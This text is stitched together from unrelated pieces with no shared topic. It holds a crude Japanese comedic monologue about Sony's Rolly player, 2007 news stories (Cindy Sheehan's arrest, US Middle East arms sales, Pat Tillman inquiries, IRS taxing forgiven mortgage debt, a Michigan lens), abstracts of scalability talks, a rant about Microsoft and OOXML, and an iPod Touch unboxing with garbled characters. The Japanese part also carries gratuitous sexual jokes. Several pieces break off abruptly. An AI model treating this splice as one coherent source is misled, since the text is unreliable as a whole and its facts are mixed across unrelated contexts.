少なくとも 、Appleはそう思ってなくても、俺はそのニュースを見たときに、これは新しいiPodを、touchを注文を待とうと思ったの。なぜなら、このソニーのRollyについて、Appleはなにかしらの情報をつかんでて、相当警戒して今まではやらなかったフライング気味の発表をしてんじゃねえか？「Rollyが発表されたらうちのもの売れないんじゃねえか」くらいの危機感を持ってるんじゃないか？と思って、そうするとそのRollyってどんなんだ？と思って、俺はチラシの上に想像上のRollyを、もちろん女性器ですよ。で、かみさんに「あんた何描いてんのっ！？」って言われて「ローリーだよ！コレは！」なんつって、待っててさ。
で、ついに発表されるわけよ。
ホームページで 。
そのRolly が！
で、・・・何アレ？？？
あのー、 「買ったやつを指差して笑えるやつ」が出てさ。
いや、あのね、なんて説明していいかわかんない。
あの、今までさ、みなさんいろんなメーカーのそういう音楽をパソコンから落とし込んで聴けるメカを買ってきたと思うんですけど、だいたいさ、ポケットに一つ、肛門の中に一つくらいは入れてると思うんですけど。
今まで自分たちがそれに対して次の機種に望むものっていうのはさ、
いっぱい曲が入ったらいいなとか、
音質が良くなればいいなとか、
すごくコンパクトになればいいな、電池がもっと持てばいいな、とか
女性器そっくりだといいなとか、
明日の帰り道いきなり目の前に痴女が現れて俺の股間をすっごいもみほぐせばいいなとか、
お父さんが帰ってくればいいなとか、
いろいろ思う訳じゃないですか。
だけどソニーの考え方では、なんつうか、
（メーカーは）こうお客さんの思っていることを、こうキャッチするわけじゃないですか。
だからiPod陣営は小さいままビデオが見れたらいいなと思ったから新型iPod nanoでビデオ再生機能をつけたと思うんですけど、
ソニーはこう、 「 両サイドのフタがパカパカ自動的に開いたり閉まったりすればいいな」って思っちゃったんだろうね。
なんかね。ちょっと大きめのゆで卵みたいな形で、ラグビーボールみたいな形で、両サイドのところがフタみたいになってて、そこが音楽にあわせてパカって開いてそこがスピーカーになってたり、卵の中にジャイロというか重心を移動する装置が入ってるらしくて、音楽にあわせて勝手にころころ転がったりくるくる回ったりするって言う機能がすごい充実した代わりに、前のメモリーオーディオでは8GBあった容量を1GBに戻して、電池の保ちをすこぶる悪くするっていう、そういうものになったんですよ。
で、今考えるとソニーもちょっと弁護しなきゃなんないんで、言っときますけど、ソニーは元々iPodとかWalkmanとかとおんなじジャンルの商品として出すつもりは全然なくて。何か新しい、その、新しいけど、誰にもニーズが無いのは変わらないと思うけど、ジャンルとして持ち歩くもんじゃなくて。なんかプロモーションビデオが流れてるんだけど、ヤンエグの休日みたいのが、ソファーベッドに横たわりながらサイドテーブルでそいつがくるくる回ってるっていう、非常にうっとおしい感じのVTRがあんだけど。
なんだろあれ？で、なんかさ、いろいろみていると「狭い机の上は落っこちっからやめろ」みたいなことも書いてあるし。だからセンサーで、まあセンサーついて机から落っこちないようになったところで何だって話だけど、あのさ、今まであの音楽の、僕は音楽についてはLUNA SEA辞めてからノータッチなんですけど、音楽を聴いてて、「オーディオが踊ってくれたらどんなにいいか」って思ったこと・・・ある？
なんだろう、なんなんだろうか？あ、でもソニーで、一番最初にWalkmanが出たときみんなは、録音機能もない、ラジオもついてない、ちっちゃいかもしれないけどスピーカーもついてない、そんなラジカセっつうかカセットを何に使うんだ？って。それに対してWalkmanを作った男たちは、「そうじゃないんだ。外で音楽を聴く時代がくるんだ」と。で、それが世界を席巻したわけじゃないですか。
だから、そのときに、頭の固い、当時の俺たちみたいなやつが売れる訳ないよっつったけど、世界の共通語になったわけじゃないですか。だから何年か後の世界では「パカパカくるくるコロコロ」してることが、あり得るわけじゃないですか。何年か後には、あれを肛門に挿入してる人ばっかりの世界になって、大腸の中で今パカパカしてるってことになる可能性はあると思うんですけど。だけどなー。うーん。
ちょっと思うんですけど 、PSP今度薄くなるじゃん。あれさ、PSP薄くなってほしいって思ってた？俺はさ、PSPの電池がもつようになれば無敵だと思ってたの。ていうか今も思ってる。だけど、今度のやつって省電力にした代わりに電池の容量減らしてそれで前と同じ時間ゲームができますってんだよね。俺はえー？って思うわけ。そこのニーズじゃないでしょ？
で、極めつけはさ 、VAIOのさ、ゴーフルの缶みたいなのあんじゃん。丸いやつ。あれさ、あのスペース、余ってた？家に。あれを置くスペースが。なんかさ、みんなの家でパソコンを置くスペースって考えるわけじゃん。例えばさ、薄型テレビになって、テレビの上っていうスペースがなくなったから、例えば「薄型テレビの裏に張る、フックをつけてぶらさげる」とかなら、一番下の台のところは結局要るんだから、「あそこ空いてるじゃん、なるほど」って思うんだけど、今まであの円柱状のモノを置くスペースが空いてることってないよね？で、あの円柱を置くと、俺の性格的には、うめくくらい無駄なスペースが多かったりすんだけど。
今 後Walkmanのときみたいに俺が「負けました」って言わされんのかな。「そんな常識的に考えたらわかるだろ、売れる訳ないよ」っていってて、後でみんなが「ころころかぱかぱ」してるところに俺だけiPod持っちゃってる日が来んのかな。ねえ気がすんだけどな。どうなんだろうな。
( Rolly を ) 買う予定の人に、なぜ買う予定なのかすげえ聴いてみたいなあ。
そんなこといいながら俺ソニー製品が嫌いなわけじゃなくて、やっぱり一時代有ったと思うのね。過去形じゃいけないのか。だから推測するに、もともとRollyは４万円くらいで出る予定なんだけど、もともとは30万くらいで、カパカパだけじゃねえものすごいいろんな機能を盛り込んだ機能を作るプロジェクトがあって、あのー、アメリカ人のCEOのときに採算のとれないものは撤退するっつって、アイボとかを止めたりしてたでしょう。だからそういうのことでもっと巨大なプロジェクトだったのに無くされるよりマシだとかで縮小してああなったんだとすると、あの延長線上に、手をかざすと音楽が鳴るとか、部屋の温度を感知して、その日の天気によってかけるBGMを変えるとか、もっとHDDを増設とかメモリーカードを入替えられるスロットが拡張できるとかってのがあって、それを削って削ってああなったんなら、まあいらねえけど、ソニーインサイドストーリーとしては合点が行かなくもないんだけど、そうだとしても決して明るい話じゃないよね。そうなったら終わりっていうか。
あのー、ぱっと見たときの俺の印象は、「タカラから3,980円で出るんだったらすげー買う」感じってわかる？エレクトリックおもちゃとして、「あー、すごいな。子供のおもちゃもこんなとこまでハイテクきたんだ。」ってそれで、タカラかセガトイズから出てさ、ハロのバージョンも有りますってんなら俺もびっくりしたね。まあ、高くて4,980円かな。それならすごいなって思うけど。
あれさ、すっごい楽しみにしてんのが、もっと発売が近づいてくるでしょ。そうするとmonoマガジンとか、DIMEとか、日経トレンディとかデジモノステーションとかあの辺に、出てくると思うのよ。インプレッションが。
その担当になったライターさんたちはがんばって褒めると思うのよ。だってさ、そういうグッズが好きでしょうがない人がやってるけど、そこは嘘はかけないし、かといって過度に悪くもかけないじゃん。その微妙な線をすごいがんばって、この業界用語でいうところの「血涙振り絞ってやっつけてくる」と思うのよ。で、そうすると、「僕が昔、箱根に行ったときに温泉卵を食べて・・・」とかっていう話が、全部で半ページの記事の前半が「地獄谷で食べた温泉卵があまりにおいしくて６個食べたところでさすがに気持ち悪くなった。そういう話があるんですが、ところで卵と言えばソニーのRollyが、」みたいな記事で、Rollyのところ４行くらいで、「欲しい人にはたまらない」で締めてあったり。「ソニーファンは検討に値する」とかね。「担当Y」とか、お前名前書かないのか！みたいな。その辺はまあ見物だよね。

ツイートシェ ア
WASHINGTON ( Reuters ) - Calling for the impeachment of U.S. President George W. Bush and Vice President Dick Cheney , Cindy Sheehan and 45 fellow Iraq war protesters were arrested on Monday after they refused to leave a U.S. lawmaker ’s office and adjoining hallway , authorities said .
Peace activist Cindy Sheehan takes part in a march to deliver more than 1,000,000 signatures to Congressman John Conyers , appealing to him to begin impeachment proceedings against U.S. President George W. Bush and Vice President Dick Cheney , in Washington July 23 , 2007 .
REUTERS / Joshua Roberts
Before police escorted her away , Sheehan , who emerged as a leading peace activist after her son Casey was killed in Iraq in 2004 , announced what she had earlier suggested -- that she would be a candidate for Congress next year .
Sheehan said she would challenge House of Representatives Speaker Nancy Pelosi , a California Democrat .
Pelosi has refused calls to start impeachment of Bush and Cheney for what critics charge was misleading the United States into war .
The new Democratic - led Congress has been hit with approval ratings of less than 25 percent largely because of its failure to deliver on a campaign vow to withdraw troops from Iraq .
Sheehan and fellow protesters were led away in plastic handcuffs after they refused to heed repeated calls by Capitol Police to depart the office of Democratic Rep. John Conyers of Michigan , and a hallway outside his office .
“ What do we want ?
Impeachment .
When do we want it ?
Now , ” Sheehan and others chanted while seated on the floor of Conyers ’ office following her private meeting with him .
A spokeswoman for Capitol Police said the 46 protesters were being charged with disorderly conduct , a misdemeanor , and were likely to be released within hours after processing .
Conyers had raised the possibility of impeaching Bush more than a year ago while Republicans were in charge of Congress .
But Pelosi rejected the idea during last year ’s campaign that saw Democrats win control of the House and Senate , saying she wanted to concentrate efforts on ending the war .
“ The speaker is focused on changing course in Iraq by bringing our troops home safely and soon and refocusing our effort on protecting Americans from terrorism , ” said Brendan Daly , Pelosi ’s press secretary .
When Sheehan and others arrived on Capitol Hill they were confronted by a number of backers of the war .
One held a sign reading , “ Patriots want victory in Iraq . ”
When the United States sells state - of - the - art weapons systems to Arab nations , it invariably provides even more lethal and sophisticated arms to its steadfast ally , Israel , in order to help counter the firepower of its neighbors .
So , when Egypt gets the M60A3 and M1A1 Abrams battle tanks , Israel gets the TOW - 2A and Hellfire antitank missiles to blow up the Egyptian vehicles  in the event of a military confrontation between the two countries currently wedded to the 1979 Camp David peace treaty .
Likewise , when the United States grudgingly provides McDonnell Douglas F - 15 fighter planes to Saudi Arabia , Israel is armed either with Sidewinder and Sparrow air - to - air missiles or Hawk and Stinger surface - to - air missiles to bring down the US - supplied Saudi aircraft .
Every US government has ensured that no weapons sales to Arab nations would undermine Israel ’s traditional " qualitative ( military ) advantage " over its perceived rivals .
Last week , the administration of President George W. Bush ran true to form when it announced its decision to simultaneously sell arms both to Israel and seven Arab nations : Saudi Arabia , Egypt , Kuwait , Qatar , Bahrain , Oman and the United Arab Emirates .
The package , which is also expected to include one set of weapons to counter the other , includes equipment worth some 20 billion dollars to Saudi Arabia and five other Gulf states , plus 30 billion dollars in military assistance to Israel , and 13 billion dollars in similar grants to Egypt , mostly for purchases of US - made weapons systems .
The Bush administration has justified the whopping arms sales as an attempt to militarily strengthen Israel , Egypt and the Gulf states against Iran .
But academics , peace activists and military analysts see a more sinister and commercial reason for unrestrained arms sales to a politically volatile region .
" The only ‘ winners ’ from this deal are US weapons contractors , " says Dr. Natalie J. Goldring , a senior fellow with the Center for Peace and Security Studies in the Edmund A. Walsh School of Foreign Service at Georgetown University .
" For the US defense industry , this is Christmas in July , " she added , pointing out that the Bush administration ’s statements that these sales will somehow deter Iran are n’t convincing .
" Past attempts to label Iran as part of the ‘ axis of evil ’ only seem to have silenced moderate voices , and spurred the Iranian government ’s conventional and potential nuclear weapons programs , " Dr. Goldring told IPS .
In addition , she pointed out , the US government ’s record at dissuading countries from developing nuclear weapons through military means is unblemished by success .
" Our past nonproliferation successes have been the product of political , economic , and diplomatic approaches , not military measures , " she added .
During a swing through the Middle East last week , US Secretary of State Condoleezza Rice said the proposed arms sales will also " bolster the forces of moderation and support a broader strategy to counter the negative influences of al - Qaeda , Hezbollah , Syria and Iran . "
Dr. Goldring said Rice fails to effectively counter the argument that these sales are more likely to promote instability in the recipient countries because of hostility toward the United States .
Meanwhile , several US Congressmen , including Roy Blunt , Jerrold Nadler and Anthony Weiner , have threatened to block the sale  particularly to Saudi Arabia because the Saudis " have not been a true ally in further US interests in the Middle East . "
Whether they will have enough clout to deter the sale against the powerful military - industrial complex is left to be seen .
Frida Berrigan , a senior program associate with the Arms and Security Project at the New York - based New America Foundation , predicts that the proposed sale could indeed trigger a new arms race in the region .
She said new weapon sales to Egypt and Saudi Arabia will stoke Jordan ’s need for new advanced weaponry .
The sultanates ’ appetite for new fly - boy weapons is almost insatiable .
" This move seeks to repair the damage wrought in the region by the disastrous war in Iraq by throwing more fuel on the fire  introducing more weaponry in a region already wracked by a civil - sectarian conflict that ripples outward in ever widening and devastating circles , " Berrigan told IPS .
She also said this sends exactly the wrong message to the Saudi government .
" Quid pro quos in weapons sales do not work  witness the United States trying to shape and influence the actions of the Indonesian military regime through withholding spare parts of F - 16s , " Goldring said .
But the United States is not even putting conditions on these sales and grants of military aid , she added .
Asked if it was prudent for the Bush administration to sell weapons to non-democratic regimes when it is trying to spread democracy in the region , Berrigan said that of the eight nations slated for significant increases in military aid , only one ( Israel ) is a full democracy .
" The law provides citizens with the right to change their government peacefully , " according to the US State Department ’s 2006 Country Reports on Human Rights Practices .
In Egypt  despite its claims of democratic elections  the State Department found " limitations on the right of citizens to change their government " including " a state of emergency , in place almost continuously since 1967 . "
The rest of the countries are monarchies or sultanates where  in the words of the State Department ’s annual report  there is " no right to peacefully change the government . "
Dr. Goldring of Georgetown University said this sale perpetuates the myth that the US government can predict the future and say with confidence that governments will be stable for two , three , four decades .
" Yet again , the Bush administration is failing to fully take into account the long - term implications of its actions , " she said .
In the Middle East , she said , the United States is largely engaged in an arms race with itself .
It seeks to " balance " its interests in the region with ever - increasing levels of weaponry and military aid .
And the US government continues to argue that arms sales will stabilize the Middle East , despite the lack of evidence to support this assertion , she added .
" The administration claims that the majority of weapons it proposes to sell are defensive .
But if they ’re actually defensive , why does this deal reportedly include constraints on the weapons ’ range and where they can be based ? "
Dr. Goldring asked .
" Adding insult to injury , " she argued , " the administration is buying off Israel by increasing its military aid to more than 30 billion dollars over the course of the next decade . "
Berrigan countered Rice ’s argument that billions in military assistance will " bolster the forces of moderation " in the region .
Yet the military assistance will go to countries that brutally suppress their own populations .
Berrigan said all eight nations named for the aid package , that could top 60 billion dollars over ten years , have " serious " problems with regards to human rights including : torture ( Qatar , Egypt and Israel where reputable human rights groups allege that security forces use torture in interrogation of Palestinian detainees about 20 percent of the time ) ; unlawful killings ( Kuwait ) ; flogging and other forms of corporal punishment ( Kuwait , Saudi Arabia and United Arab Emirates ) ; killings , abuse of women including female genital mutilation ( Egypt ) .
BigTable : Google 's Distributed Structured Storage System
Bigtable is a distributed storage system for managing structured data that is designed to scale to a very large size : petabytes of data across thousands of commodity servers .
Many projects at Google store data in Bigtable , including web indexing , Google Earth , and Google Finance .
These applications place very different demands on Bigtable , both in terms of data size ( from URLs to web pages to satellite imagery ) and latency requirements ( from backend bulk processing to real - time data serving ) .
Despite these varied demands , Bigtable has successfully provided a flexible , high - performance solution for all of these Google products .
In this paper we describe the simple data model provided by Bigtable , which gives clients dynamic control over data layout and format , and we describe the design and implementation of Bigtable .
MapReduce Used on Large Data Sets
MapReduce is a programming model and library designed to simplify distributed processing of huge datasets on large clusters of computers .
This is achieved by providing a general mechanism which largely relieves the programmer from having to handle challenging distributed computing problems such as data distribution , process coordination , fault tolerance , and scaling .
While working on Google maps , I 've used MapReduce extensively to process and transform datasets which describe the earth 's geography .
In this talk , I 'll introduce MapReduce , demonstrating its broad applicability through example problems ranging from basic data transformation to complex graph processing , all the in the context of geographic data .
Abstractions for Handling Large Datasets
MapReduce , BigTable , and Other Distributed System Abstractions for Handling Large Datasets Jeff Dean , Google , Inc. Search is one of the most important applications used on the internet , but it also poses some of the most interesting challenges in computer science .
Providing high - quality search requires understanding across a wide range of computer science disciplines , from lower - level systems issues like computer architecture and distributed systems to applied areas like information retrieval , machine learning , data mining , and user interface design .
In this talk , I 'll highlight some of the behind - the - scenes pieces of infrastructure that we 've built in order to operate Google 's services .
Building Large Systems at Google
Google deals with large amounts of data and millions of users .
We 'll take a behind - the - scenes look at some of the distributed systems and computing platform that power Google 's various products , and make the products scalable and reliable .
YouTube Scalability
This talk will discuss some of the scalability challenges that have arisen during YouTube 's short but extraordinary history .
YouTube has grown incredibly rapidly despite having had only a handful of people responsible for scaling the site .
Topics of discussion will include hardware scalability , software scalability , and database scalability .
Blaine Cook on Scaling Twitter
Blaine gave this talk on how they scaled Twitter .
Twitter is probably the largest Ruby on Rails application in production today , so it was filled with lots of great insights including many not so obvious tips .
Wikipedia and MediaWiki
Over four years , MediaWiki has evolved from a quick hack to run a little - known encyclopedia web site to the monster engine behind a heavily - used public site , while maintaining the simplicity needed for an entry - level intranet wiki .
Brion reviews past and future directions for Wikipedia 's software and hardware , and how modern buzzword technologies could power and simplify the wiki world .
Behind the Scenes at LiveJournal : Scaling Storytime
The history and lessons learned while scaling a community site ( LiveJournal.com ) from a single server with a dozen friends to hundreds of machines and 10 M + users .
What 's worked , what has n't , and all the things we 've had to build ourselves , now in common use thoughout the " Web 2.0 " world , including memcached , MogileFS , Perlbal , and our job dispatch systems .
Lessons In Building Scalable Systems
Since launching Google
Talk in the summer of 2005 , we have integrated the service with two large existing products : Gmail and orkut .
Each of these integrations provided unique scalability challenges as we had to handle a sudden big increase in the number of users .
Today , Google Talk supports millions of users and handles billions of packets per day .
I will discuss several practical lessons and key insights from our experience that can be used for any project .
These lessons will cover both engineering and operational areas .
Reza Behforooz is a Staff Engineer at Google and is currently the technical lead for the Google Talk servers .
He 's passionate about building large systems and working on communication products in an attempt to make the world a smaller place .
While at Google , he has primarily worked on Google Talk , Gmail , orkut , Google Groups , and shared infrastructure used by several Google applications .
Distributed Caching Essential Lessons
In this presentation , recorded at Javapolis , Cameron Purdy shows how to improve application performance & scalability via caching architectures to reduce load on the database tier and & clustered caching to provide transparent fail - over by reliably sharing live data among clustered JVMs .
Lustre File System
Lustre is a scalable open source Linux cluster file system that powers 6 of the top 10 computers in the world .
It is resold by HP , SUN , Dell and many other OEM and storage companies , yet produced by a small powerful technology company , Cluster File Systems , Inc .
This lecture will explain the Lustre architecture and then focus on how scalability was achieved .
We will address many aspects of scalability mostly from the field and some from future requirements , from having 25,000 clients in the Red Storm computer to offering exabytes of storage .
Performance is an important focus and we will discuss how Lustre serves up over 100GB / sec today going to 100TB / sec in the coming years .
It will deliver millions of metadata operations per second in a cluster and , write 10's of thousands of small files per second on a single node .
Scalable Test Selection Using Source Code
As the number of automated regression tests increase , the ability to run all of them in a reasonable amount of time becomes more and more difficult , and simply does n't scale .
Since we are looking for regressions , it is useful to hone in on the parts of the code that have changed from the last run to help select a small subset of tests that are likely to find the regression .
In this way we are only running the tests that need to be run as your system gets larger and the number of possible tests scales outward .
We have devised a method to select a subset of tests from an existing test set for scalable regression testing based on source code changes , or deltas .
The selection algorithm is a static data mining technique that establishes the relationship between source code deltas and test case execution results .
Test selection is then based on the established correlation .
In this talk , we will discuss the benefits and also the pitfalls involved in having such an infrastructure .
Finally , we will talk about how best to add it to a nightly or continuous test automation infrastructure .
Ryan Gerard is currently an SQA Engineer at Symantec .
He has a BS in Computer Science and Engineering from UCLA , and is currently pursuing his MS in Information Security .
Ryan ’s particular specialties are in web technologies and security testing , although his interests span kernel - level technologies to process improvements to data analysis .
SCTPs Reliability and Fault Tolerance
Low cost clusters are usually built from commodity parts and use standard transport protocols like TCP / IP .
Once systems become large enough , reliability and fault tolerance become an important issue and TCP / IP often requires additional mechanisms to ensure reliability of the application .
The Stream Control Transmission Protocol ( SCTP ) is a newly standardized transport protocol that provides additional mechanisms for reliability beyond that of TCP .
The added reliability and fault tolerance of SCTP may function better for MapReduce - like distributed applications on large commodity clusters .
SCTP has the following features that provide additional levels of reliability and fault tolerance .
Selective acknowledgment ( SACK ) is built - in to the protocol with the ability to express larger gaps than TCP ; as a result , SCTP outperforms TCP under loss .
For cluster nodes with multiple interfaces , SCTP supports multihoming , which transparently provides failover in the event of network path failure .
SCTP has the stronger CRC32 c checksum which is necessary with high data rates and large scale systems .
SCTP also allows multiple streams within a single connection , providing a solution to the head - of - line blocking problem present in TCP - based farming applications like Google 's MapReduce .
Like TCP , SCTP provides a reliable data stream by default , but unlike TCP , messages can optionally age or reliability can be disabled altogether .
The SCTP API provides both a one - to - one ( like TCP ) and a one - to - many ( like UDP ) socket style ; use of a one - to - many style socket can reduce the number of file descriptors required by an application , making it more scalable .
Building a Scalable Resource Management
This talk will describe the architecture and implementation details for building a highly scalable resource management layer that can support a variety of applications and workloads .
This technology has evolved from large scale computing grids deployed in production at customers such as Texas Instruments , AMD , JP Morgan , and various government labs .
We will show how to build a centralized dynamic load information collection service that can handle up to 5000 nodes / 20,000 cpus in a single cluster .
The service is able to gather a variety of system level metrics and is extensible to collect up to 256 dynamic or static attributes of a node and actively feed them to a centralized master .
A built - in election algorithm ensures timely failover of the master service ensuring high - availability without the need for specialized interconnects .
This building block is extended to multiple clusters that can be organized hierarchically to support a single resource management domain that can span multiple data centers .
We believe the current architecture could scale to 100,000 nodes / 400,000 cpus .
Additional services such as a distributed process execution service , and a policy - based resource allocation engine which leverage this core scale - out clustering service are described .
The protocols , communication overheads , and various design tradeoffs that were made the development of these services will be presented along with experimental results from various tests , simulations and production environments .
VeriSign's Global DNS Infrastucture
VeriSign 's global network of nameservers for the .com and .net domains sees 500,000 DNS queries per second during its daily peak , and ten times that or more during attacks .
By adding new servers and bandwidth , we 've recently increased capacity to handle many times that query volume .
Name and address changes are distributed to these nameservers every 15 seconds -- from a provisioning system that routinely receives one million domain updates in an hour .
In this presentation we describe VeriSign 's production DNS implementation as a context for discussing our approach to highly scalable , highly reliable architectures .
We will talk about the underlying Advanced Transactional Lookup and Signaling software , which is used to handle database extraction , validation , distribution and name resolution .
We also will show the central heads - up display that rolls up statistics reported from each component in the infrastructure .

Scalability and Efficiency on Data Mining Applied to Internet Applications
The Internet went well beyond a technology artefact , increasingly becoming a social interaction tool .
These interactions are usually complex and hard to analyze automatically , demanding the research and development of novel data mining techniques that handle the individual characteristics of each application scenario .
Notice that these data mining techniques , similarly to other machine learning techniques , are intensive in terms of both computation and I/O , motivating the development of new paradigms , programming environments , and parallel algorithms that support scalable and efficient applications .
In this talk we present some results that justify not only the need for developing these new techniques , as well as their parallelization .
Customizable Scalable Compute Intensive Stream Queries
GSDM is a data stream management system running on cluster computers .
The system is extensible through user - defined data representations and computations .
The computations are specified as stream queries continuously computed over windows of data sliding over the streams .
Our applications include a virtual radio telescope requiring advanced computations over huge streams of data .
The system needs to be highly scalable w.r.t. both data and computations .
Rather than providing only built - in distribution strategies , the system allows the user to define distribution templates to specify customized distribution strategies for user functions in stream queries .
The distribution templates are shown to provide scalability for stream computations that grow more expensive with larger windows .
Distribution templates can be defined in terms of other distribution templates , enabling specification of large distribution patterns of communicating computing nodes .
This also allows optimizing templates that generate new templates based on profiling the computations .

Introduction to MySQL Cluster
The NDB storage engine ( MySQL Cluster ) is a high - availability storage engine for MySQL .
It provides synchronous replication between storage nodes and many mysql servers having a consistent view of the database .
In 4.1 and 5.0 it 's a main memory database , but in 5.1 non-indexed attributes can be stored on disk .
NDB also provides a lot of determinism in system resource usage .
I 'll talk a bit about that .
New features in 5.1 including cluster to cluster replication , disk based data and a bunch of other things .
anybody that is attending the mysql users conference may find this eerily familiar .

Mr. Tillman , who was posthumously promoted to corporal and awarded the Silver Star for valor , inspired legions after he quit his spot as a star defensive back for the Arizona Cardinals professional football team to be an Army Ranger .

The Army recently completed two inquiries into his death .
The investigations found that even though soldiers and commanders suspected almost immediately after the death that it was accidental fratricide , Corporal Tillman ’s family was not notified about the true circumstances until more than a month later , a violation of Army rules .
The report from the inspector general ’s office in the Defense Department singled out four generals and five other officers for potential discipline but said that they had done nothing criminal and that there was no broader cover-up .
The report was especially critical , however , of Lt. Gen. Philip R. Kensinger Jr. , head of the Army Special Operations Command at the time of Corporal Tillman ’s death .
The document said General Kensinger most likely knew of the suspected fratricide before a nationally televised memorial service on May 3 that he and the Tillman family attended .
The oversight committee had requested that General Kensinger testify on Tuesday , but he declined through a lawyer , citing his constitutional right to avoid compelled self - incrimination .
Committee members heard from Specialist Bryan O’Neal , who was with Corporal Tillman when he died .
Specialist O’Neal said he knew immediately that it was American troops that had killed his comrade and that he wanted to tell Kevin Tillman , who was a specialist in the same platoon , right away .
But he was barred from doing so , he said , by his battalion commander , Lt. Col. Jeff Bailey .
“ I was ordered not to tell him what happened , ” he said , explaining that it was made clear that he “ would get in trouble . ”
It ’s bad enough to end up in an economic conundrum where you lose your house to foreclosure , but , wait , there ’s something worse waiting for you from your friends fiends at the Internal Revenue Service :
Two years ago , William Stout lost his home in Allentown , Pa. , to foreclosure when he could no longer make the payments on his $ 106,000 mortgage .
Wells Fargo offered the two - bedroom house for sale on the courthouse steps .
No bidders came forward .
So Wells Fargo bought it for $ 1 , county records show .
Despite the setback , Mr. Stout was relieved that his debt was wiped clean and he could make a new start .
He married and moved in with his wife , Denise .
But on July 9 , they received a bill from the Internal Revenue Service for $ 34,603 in back taxes .
The letter explained that the debt canceled by Wells Fargo upon foreclosure was subject to income taxes , as well as penalties and late fees .
The couple had a month to challenge the charges .
For those who struggle to pay their bills , who watch their housing payments rise out of reach with their adjustable - rate mortgages , who lose a job or who fall victim to illness , losing one ’s home can feel like hitting bottom .
But one more financial indignity may await as the fallout from the great housing boom ripples across the United States .
“ Getting that tax bill , ” Mrs . Stout recalled , “ my first thought was that I needed to see my family doctor to help me with my stress , because we had a big mortgage and other debt and then here came the I.R.S. saying we owe this . ”
Manipulating light waves , or electromagnetic radiation , has led to many technologies , from cameras to lasers to medical imaging machines that can see inside the human body .
Scientists at the University of Michigan have developed a way to make a lens - like device that focuses electromagnetic waves down to the tiniest of points .
The breakthrough opens the door to the next generation of technology , said Roberto Merlin , professor of physics at U - M .
His research on the discovery will be published online July 12 in Science Express .
Everywhere we go , we are surrounded by electromagnetic waves that are generated naturally , such as sunlight , and artificially , by appliances such as microwave ovens and radio transmitters .
Some waves are visible , and some are invisible .
Materials respond differently to different wavelengths , and when using electromagnetic waves , one is usually limited by the length of the light wave , Merlin said .
For example , the amount of information you can store on a CD is limited by the number of bits you can fit on the CD , and this is dictated by the length of the electromagnetic wave .
The smaller the wavelength , the smaller the bit , which means more bits of data can be stored on the CD .
There is a huge push underway to find ways to get around this limitation , but until now scientists did n't have a good method for achieving that , Merlin said .
Using mathematical models , Merlin developed a formula that removes the wavelength limitation .
Merlin is now working with assistant professor Anthony Grbic from the U - M College of Engineering to build the device , and they have filed for a patent .
The device will look like a plate or a disc , and is etched with a specific pattern .
As the waves pass through the patterned lens , it is sculpted into different sizes and shapes .
The lens does not refract , or bend the light waves --- which is how conventional lenses work --- but rather it reshapes the wave .
The discovery holds promise for applications in data storage , non-contact sensing , imaging , and nanolithography .
With the new technology , a CD could hold up to one hundred times more information by using terahertz radiation rather than visible light , even though the length of a terahertz wave is about 1000 times longer .
There 's been a lot of debate in the community about how OSI should properly handle Microsoft 's planned submission of some of its licenses for OSD certification .
That debate has been been going on within OSI , too .
OSI 's official position , from the beginning , which I helped formulate and have expressed to any number of reporters and analysts , is that OSI will treat any licenses submitted to Microsoft strictly on their merits , without fear or favor .
That remains OSI 's position .
But ...
But I find that my resolve is being sorely tested .
Because Microsoft 's behavior in the last few months with respect to OOXML has been egregious .
They have n't stopped at pushing a " standard " that is divisive , technically bogus , and an obvious tool of monopoly lock - in ; they have resorted to lying , ballot - stuffing , committee - packing , and outright bribery to ram it through the ISO standardization process in ways that violate ISO 's own guidelines wholesale .
If Microsoft succeeds ( which is beginning to look likely ) they will have not merely damaged the prospects of open - source software , they will have ruined the good name of ISO by corrupting its people and processes .
Because if OOXML , with all its huge flaws , really does pass , no one who has been conscious while this was going on is going to believe the process it passed through was n't a charade bought and paid for by Microsoft marketing .
There is always , of course , a certain amount of corporate gaming of technical standards .
But , generally speaking , the process works ; it creates conditions under which users get more choices and markets clear more efficiently than they would without the standards .
That 's why the destruction of ISO 's reputation would be a calamity .
The trust it has built up over many years is an asset worth all of the billions of dollars in friction costs avoided by standardization and thus not paid by the entire community of computer and telecomms users .
Microsoft , in an attempt to preserve its
Office monopoly , is making a determined effort to destroy that value .
This is not behavior that we , as a community , can live with .
Despite my previous determination , I find I 'm almost ready to recommend that OSI tell Microsoft to ram its licenses up one of its own orifices , even if they are technically OSD compliant .
Because what good is it to conform to the letter of OSD if you 're raping its spirit ?
The iPod Touch just went on sale , so we made our way down to get one before the Apple Stores even admitted they had them in stock .
Hidden away in cabinets behind the register , they were only being sold to those who asked for them by name .
We raced home with a 16GB model and took some quality unboxing and iPhone comparison photos .
The Touch comes in a box similar to the iPhone , but only about half as deep .
On the cover is Corinne Bailey Rae , a fresh - face artist that might remind you of Norah Jones , Macy Gray , and a bit of Billie Holiday .
Inside the box , the Touch lays in a black tray otherwise identical to the clear version of the iPhone 's packaging .
Everything else hides within a black envelope and a white package .
The Touch itself is a fewÂ millimeters thinner than the iPhone ; 8 mm versus 11.6 mm , but it appears to be about half as thick and feels considerably thinner in the hand .
When flipped over , the Touch exposes that it 's not just an iPhone without a cellular antenna ; its an iPod .
Rather than a buff aluminum finish with a polished Apple logo , the Touch has the iconic polished aluminum back with a textured logo .
The top corner features a black plastic window for the WiFi antenna in place of the iPhone 's camera , and it has a wake button just like the iPhone , although its on the opposite end of the top edge .
Like the Nano , it has a headphone jack at the bottom of the unit next to the Dock connector .
There are no speakers like the iPhone .
That means the Touch is destined to end up looking like previous iPods .
My 30 GB 3G iPod delivered just under twice theÂ storage in a much larger package with all the fancy screen and touch features .
( Do n't laugh now Touch , because in two years you 'll look just as scoured up . )
Fortunately , at least the screen side will still look nice , thanks to the same glass face as the iPhone .
Â Â
The Touch is far thinner than the old iPod due to its use of Flash RAM .
It 's still considerably thinner than the iPhone . Â
Inside the black box is a couple Apple stickers , a photoÂ pamphletÂ demonstrating its features , another booklet of legalese , and a screen sized polishing cloth embossed with " iPod . "
Rip open the white package and out jumps a USB cable , standard set of iPod headphones , a form fitting Dock adapter , and a mysterious clear bit of plastic .
What 's this ?
A display stand :
Of course , when placed in the stand vertically , its no good as a music player , because it blocks the headphone port , and the unit has no speakers .
I suppose one could use it as a picture frame .
It also works horizontally , making it functional as a Coverflow - oriented jukebox or as a movie player , so you can watch video without holding it .
Mine shipped out of the box with no charge at all , but as soon as I plugged it in , it told me to go to iTunes .
I did n't immediately realize that I 'd plugged in a FireWire cable .
As with all iPods , the Touch needs a USB cable to sync , but will still charge over an old FireWire one .
